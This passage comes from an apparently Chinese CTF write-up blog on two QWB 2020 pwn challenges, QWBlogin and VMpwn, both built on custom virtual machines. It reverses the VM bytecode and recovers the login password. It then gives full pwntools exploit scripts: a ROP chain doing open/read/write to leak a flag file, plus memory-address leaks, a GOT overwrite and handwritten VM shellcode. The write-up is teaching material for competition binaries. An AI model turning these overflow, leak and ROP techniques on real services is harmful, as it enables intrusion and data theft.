class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x40</span>]<span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x57</span>| W<span class="hljs-keyword">jne</span> <span class="hljs-number">0x3</span><span class="hljs-keyword">jmp</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">hlt</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x40</span>], <span class="hljs-built_in">r9</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">word</span> <span class="hljs-number">0</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">word</span> <span class="hljs-number">0x40</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">syscall</span> data<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x40</span>]<span class="hljs-keyword">xor</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x77</span><span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x26</span>| Q<span class="hljs-keyword">jne</span> <span class="hljs-number">0xffffffc9</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x40</span>], <span class="hljs-built_in">r9</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x48</span>], <span class="hljs-built_in">r9</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x50</span>], <span class="hljs-built_in">r9</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x58</span>], <span class="hljs-built_in">r9</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x60</span>], <span class="hljs-built_in">r9</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">word</span> <span class="hljs-number">0</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">word</span> <span class="hljs-number">0x40</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x21</span><span class="hljs-keyword">syscall</span> data| read(<span class="hljs-number">0</span>, data[<span class="hljs-number">0x40</span>], <span class="hljs-number">0x21</span>)<span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r8</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x40</span>]| G00DR3VR<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r9</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x427234129827abcd</span><span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r9</span><span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x10240740dc179b8a</span><span class="hljs-keyword">je</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">hlt</span><span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r8</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x48</span>]| W31LD0N3<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r9</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x127412341241dead</span><span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r9</span><span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x213a22705e70edfa</span><span class="hljs-keyword">je</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">hlt</span><span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r8</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x50</span>]| Try2Pwn!<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r9</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x8634965812abc123</span><span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r9</span><span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0xa75ae10820d2b377</span><span class="hljs-keyword">je</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">hlt</span><span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r8</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x58</span>]| GOGOGOGO<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r9</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x123216781236789a</span><span class="hljs-keyword">xor</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">r9</span><span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x5d75593f5d7137dd</span><span class="hljs-keyword">je</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">hlt</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x34</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x6</span><span class="hljs-keyword">syscall</span> data<span class="hljs-keyword">push</span> <span class="hljs-built_in">qword</span> r17<span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> r17, r16<span class="hljs-keyword">sub</span> r16, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x100</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r4</span>, r16<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r5</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0xa214f474f4721</span><span class="hljs-keyword">push</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r5</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r5</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x574f4e54494e5750</span><span class="hljs-keyword">push</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r5</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r5</span>, r16<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r2</span>, r16<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0xf</span><span class="hljs-keyword">syscall</span> stack<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">r4</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x800</span><span class="hljs-keyword">syscall</span> stack| read(<span class="hljs-number">0</span>, stack[], <span class="hljs-number">0x800</span>)<span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0</span>         <span class="hljs-keyword">jnl</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">hlt</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">r0</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">r4</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> r16, r17      <span class="hljs-keyword">pop</span> <span class="hljs-built_in">qword</span> r17<span class="hljs-keyword">ret</span></code></pre><p>于是程序就比较清晰了，如果输入了<code>password</code>为<code>QWQG00DR3VRW31LD0N3Try2Pwn!GOGOGOGO</code>就能走到最后溢出的地方</p><p>最后在<code>read(0, stack, 0x800)</code>的地方会出现溢出，然后在<code>ret</code>的时候把栈上的内容<code>pop</code>到<code>vm.pc</code>，于是就需要在<code>test.bin</code>里面找到可以用<code>gadgets</code></p><h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><h4 id="gadgets"><a href="#gadgets" class="headerlink" title="gadgets"></a>gadgets</h4><p>在程序<code>RET</code>之后还有一大段无关的<code>opcode</code>，做到这步的时候才知道，这些就是为了凑<code>gadgets</code>的</p><p>其中标记为<code>R</code>的是不需要限制的</p><pre><code class="hljs python"><span class="hljs-comment"># 0x0d 0xR6 0x00 0x11 0xRR</span>pop_r00_ret = <span class="hljs-number">0x2f5</span>         <span class="hljs-comment"># 0x46</span><span class="hljs-comment"># 0x0d 0xR6 0x01 0X11 0xRR</span>pop_r01_ret = <span class="hljs-number">0x377</span>         <span class="hljs-comment"># 0x46</span><span class="hljs-comment"># 0x0d 0xR6 0x02 0x11 0xRR</span>pop_r02_ret = <span class="hljs-number">0x45c</span>         <span class="hljs-comment"># 0x46</span><span class="hljs-comment"># 0x0d 0xR6 0x03 0x11 0xRR</span>pop_r03_ret = <span class="hljs-number">0x4e1</span>         <span class="hljs-comment"># 0x46</span><span class="hljs-comment"># 0x20 0x0a 0x11 0xRR</span>sys_open_ret = <span class="hljs-number">0x6ed</span><span class="hljs-comment"># 0x20 0xR8 0x11 0xRR</span>sys_data_ret = <span class="hljs-number">0x5b1</span><span class="hljs-comment"># 0x20 0xR9 0x11 0xRR</span>sys_stack_ret = <span class="hljs-number">0x617</span></code></pre><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>由于<code>syscall</code>中只有<code>open | read | write | close</code>可用，很自然想到<code>orw</code>，然后构造<code>rop</code>链就行了，其中由于最开始打开了<code>test.bin</code>文件，所以<code>fd=4</code>，最初写<code>exp</code>的时候被坑了一下，以及调试的时候希望能有结构体的符号，我编译了<code>struct.c =&gt; struct.o</code>再在调试的时候<code>add-symbol-file struct.o 0</code>即可</p><pre><code class="hljs python">payload = <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x108</span><span class="hljs-comment"># read(0, data[0x100], 0x20)</span><span class="hljs-comment"># r00 = 1 r01 = 0 r02 = 0x100 r03 = 0x20</span>payload += p64(pop_r00_ret) + p64(<span class="hljs-number">1</span>) + p64(pop_r01_ret) + p64(<span class="hljs-number">0</span>) + p64(pop_r02_ret) + p64(<span class="hljs-number">0x100</span>) + p64(pop_r03_ret) + p64(<span class="hljs-number">0x20</span>)payload += p64(sys_data_ret)<span class="hljs-comment"># open(data[0x100], 0)</span><span class="hljs-comment"># r00 = 0 r01 = 0x200 r02 = 0</span>payload += p64(pop_r00_ret) + p64(<span class="hljs-number">0</span>) + p64(pop_r01_ret) + p64(<span class="hljs-number">0x100</span>) + p64(pop_r02_ret) + p64(<span class="hljs-number">0</span>)payload += p64(sys_open_ret)<span class="hljs-comment"># read(4, data[0x100], 0x30)</span><span class="hljs-comment"># r00 = 1 r01 = 4 r02 = 0x100 r03 = 0x30</span>payload += p64(pop_r00_ret) + p64(<span class="hljs-number">1</span>) + p64(pop_r01_ret) + p64(<span class="hljs-number">0x4</span>) + p64(pop_r02_ret) + p64(<span class="hljs-number">0x100</span>) + p64(pop_r03_ret) + p64(<span class="hljs-number">0x30</span>)payload += p64(sys_data_ret)<span class="hljs-comment"># write(1, data[0x100], 0x30)</span><span class="hljs-comment"># r00 = 2 r01 = 1 r02 = 0x100 r03 = 0x30</span>payload += p64(pop_r00_ret) + p64(<span class="hljs-number">2</span>) + p64(pop_r01_ret) + p64(<span class="hljs-number">0x1</span>) + p64(pop_r02_ret) + p64(<span class="hljs-number">0x100</span>) + p64(pop_r03_ret) + p64(<span class="hljs-number">0x30</span>)payload += p64(sys_data_ret)</code></pre><p>强的大佬，不需要<code>instruction.h</code>都能在5个小时内做出来，而我就是只菜鸡</p><p><a href="https://github.com/Vang3lis/CTF_repo/tree/master/QWB_2020/QWBlogin">QWBlogin 题目</a></p><h2 id="VMpwn"><a href="#VMpwn" class="headerlink" title="VMpwn"></a>VMpwn</h2><p>这个题目跟上一个题目一样先逆向，但是这个题目跟<code>QWBlogin</code>相比实现<code>vm</code>的时候简单一些</p><p>其中有一个 <code>chunk 0x30</code>用来记录寄存器的值<code>vm[0] vm[1] vm[2]</code> 类似<code>rdi, rsi, rdx</code>在<code>syscall</code>时会用到，<code>vm[3]</code>为<code>sp</code>，<code>vm[5]</code>为 <code>pc</code></p><p>在最后的关键操作为对于<code>read(0, stack, 0x1000)</code>（栈只有<code>0x100</code>个字节）</p><pre><code class="hljs assembly">pwndbg&gt; distance 0x555555759050 0x55555575ad680x555555759050-&gt;0x55555575ad68 is 0x1d18 bytes (0x3a3 words) RAX  0x7ffff7b156c0 (read) ◂— cmp    dword ptr [rip + 0x2c3039], 0 ► 0x5555555555db    call   rax &lt;0x7ffff7b156c0&gt;        fd: 0x0        buf: 0x55555575ad68 ◂— 0x0        nbytes: 0x1000pwndbg&gt; telescope 0x55555575801000:0000│   0x555555758010 ◂— 0x001:0008│   0x555555758018 —▸ 0x55555575ad68 ◂— 0x002:0010│   0x555555758020 ◂— 0x100003:0018│   0x555555758028 —▸ 0x55555575ad68 ◂— 0x004:0020│   0x555555758030 ◂— 0x005:0028│   0x555555758038 —▸ 0x5555557572d6 ◂— 0x772c6b6f11028f10</code></pre><p>然后<code>puts(stack)</code>，可以看到该虚拟栈上有<code>heap</code>地址和<code>elf</code>地址，但是只能泄漏一个</p><pre><code class="hljs assembly">pwndbg&gt; telescope 0x55555575ad68 0x3000:0000│ rsi  0x55555575ad68 ◂— &#39;1234454636\n&#39;01:0008│      0x55555575ad70 ◂— 0xa3633 &#x2F;* &#39;36\n&#39; *&#x2F;02:0010│      0x55555575ad78 ◂— 0x0... ↓1e:00f0│      0x55555575ae58 —▸ 0x555555758050 ◂— 0x20746168772c6b6f (&#39;ok,what &#39;)1f:00f8│      0x55555575ae60 ◂— 0x020:0100│      0x55555575ae68 —▸ 0x555555757851 ◂— 0xff</code></pre><p>接下来同第一步的<code>read(0, stack, 0x1000)</code> <code>write(0, stack, 0x20)</code>然后<code>ret</code></p><p>这个程序中有一个两个比较奇怪的地方，由于<code>ret</code>的时候程序的实现，是将<code>sp-=8</code>，但是<code>PUSH</code>为<code>sp-=8</code> <code>POP</code>为<code>sp+=8</code>，因此<code>ret</code>的时候比较奇怪，另外就是与<code>QWBlogin</code>相比没有 什么能用的<code>gadget</code>，因此想法只能为按照<code>vm</code>的规则，写<code>shellocde</code>，然后在最后<code>ret</code>的时候跳转过去，但是该题用 <code>seccomp</code>限制了只能 <code>orw</code>，且没有给<code>open</code>的 <code>syscall</code>只能泄漏</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>因此思路就是，先利用<code>puts</code>泄漏<code>elf</code>的地址，然后再<code>ret</code>到最初<code>elf_code+0x3</code>然后再泄漏<code>heap</code>，<code>ret</code>到写入栈上的<code>shellcode</code></p><p>利用<code>puts</code>泄漏<code>libc</code>，然后再次输入到栈上，利用<code>\x6d: mov reg[0], 0</code>作为<code>nop</code>，编写<code>shellcode</code></p><p>然后将<code>open</code>写入<code>free</code>的位置，因此在调用<code>syscall 03</code>时就是调用<code>open</code>，最后利用<code>orw</code>进行读取<code>flag</code></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code class="hljs python"><span class="hljs-comment"># heap+0x2e68 =&gt; elf_bss</span>io.sendafter(<span class="hljs-string">&quot;name:&quot;</span>, <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0xff</span>+<span class="hljs-string">&quot;#&quot;</span>)io.recvuntil(<span class="hljs-string">&quot;#&quot;</span>)elf.address = u64(io.recvn(<span class="hljs-number">6</span>) + <span class="hljs-string">&quot;\x00\x00&quot;</span>) - <span class="hljs-number">0x203851</span>success(<span class="hljs-string">&quot;elf&quot;</span>, elf.address)<span class="hljs-comment"># 0xf8 + ret </span>io.sendafter(<span class="hljs-string">&quot;say:&quot;</span>, <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0x100</span> + p64(elf.address + <span class="hljs-number">0x203023</span>))io.sendafter(<span class="hljs-string">&quot;name:&quot;</span>, <span class="hljs-string">&quot;\x50&quot;</span>)heap = u64(io.recvn(<span class="hljs-number">6</span>) + <span class="hljs-string">&quot;\x00\x00&quot;</span>) - <span class="hljs-number">0x50</span>success(<span class="hljs-string">&quot;heap&quot;</span>, heap)<span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">mov reg[0], read_got</span><span class="hljs-string">puts</span><span class="hljs-string">mov reg[0], 0</span><span class="hljs-string">mov reg[1], heap + addr</span><span class="hljs-string">mov reg[2], 0x1000</span><span class="hljs-string">read        </span><span class="hljs-string">//  use 0x6d: mov reg[0], 0 as nop</span><span class="hljs-string">&#x27;&#x27;&#x27;</span>payload = <span class="hljs-string">&quot;\x11&quot;</span> + p64(elf.got[<span class="hljs-string">&#x27;read&#x27;</span>])payload += <span class="hljs-string">&quot;\x8f\x02&quot;</span>payload += <span class="hljs-string">&quot;\x6d&quot;</span>payload += <span class="hljs-string">&quot;\x12&quot;</span> + p64(heap+<span class="hljs-number">0x2d60</span>)payload += <span class="hljs-string">&quot;\x13&quot;</span> + p64(<span class="hljs-number">0x1000</span>)payload += <span class="hljs-string">&quot;\x8f\x00&quot;</span>payload = payload.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;A&quot;</span>)payload += p64(heap+<span class="hljs-number">0x2d60</span>)io.sendafter(<span class="hljs-string">&quot;say:&quot;</span>, payload)io.recvuntil(<span class="hljs-string">&quot;bye~\n&quot;</span>)libc.address = u64(io.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>, drop=<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&quot;\x00&quot;</span>)) - libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">flag</span><span class="hljs-string">0x6d * 0x50</span><span class="hljs-string">mov reg[1], elf.address+0x203900</span><span class="hljs-string">mov reg[2], 8</span><span class="hljs-string">read</span><span class="hljs-string">mov reg[0], heap+0x2d60</span><span class="hljs-string">mov reg[1], 0</span><span class="hljs-string">open</span><span class="hljs-string">mov reg[0], 3</span><span class="hljs-string">mov reg[1], bss</span><span class="hljs-string">mov reg[2], 0x30</span><span class="hljs-string">read</span><span class="hljs-string">mov reg[0], 1</span><span class="hljs-string">mov reg[1], bss</span><span class="hljs-string">mov reg[2], 0x30</span><span class="hljs-string">write</span><span class="hljs-string">&#x27;&#x27;&#x27;</span>payload = <span class="hljs-string">&quot;flag\x00&quot;</span>payload = payload.ljust(<span class="hljs-number">0x50</span>, <span class="hljs-string">&quot;\x6d&quot;</span>)payload += <span class="hljs-string">&quot;\x12&quot;</span> + p64(elf.address+<span class="hljs-number">0x2038f8</span>)payload += <span class="hljs-string">&quot;\x13&quot;</span> + p64(<span class="hljs-number">8</span>)payload += <span class="hljs-string">&quot;\x8f\x00&quot;</span>payload += <span class="hljs-string">&quot;\x11&quot;</span> + p64(heap+<span class="hljs-number">0x2d60</span>)payload += <span class="hljs-string">&quot;\x6e&quot;</span>payload += <span class="hljs-string">&quot;\x8f\x03&quot;</span>payload += <span class="hljs-string">&quot;\x11&quot;</span> + p64(<span class="hljs-number">3</span>)payload += <span class="hljs-string">&quot;\x12&quot;</span> + p64(elf.bss()+<span class="hljs-number">0x400</span>)payload += <span class="hljs-string">&quot;\x13&quot;</span> + p64(<span class="hljs-number">0x30</span>)payload += <span class="hljs-string">&quot;\x8f\x00&quot;</span>payload += <span class="hljs-string">&quot;\x11&quot;</span> + p64(<span class="hljs-number">1</span>)payload += <span class="hljs-string">&quot;\x12&quot;</span> + p64(elf.bss()+<span class="hljs-number">0x400</span>)payload += <span class="hljs-string">&quot;\x13&quot;</span> + p64(<span class="hljs-number">0x30</span>)payload += <span class="hljs-string">&quot;\x8f\x01&quot;</span>io.send(payload)sleep(<span class="hljs-number">0.03</span>)io.send(p64(libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]))io.interactive()io.close()</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>vm</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
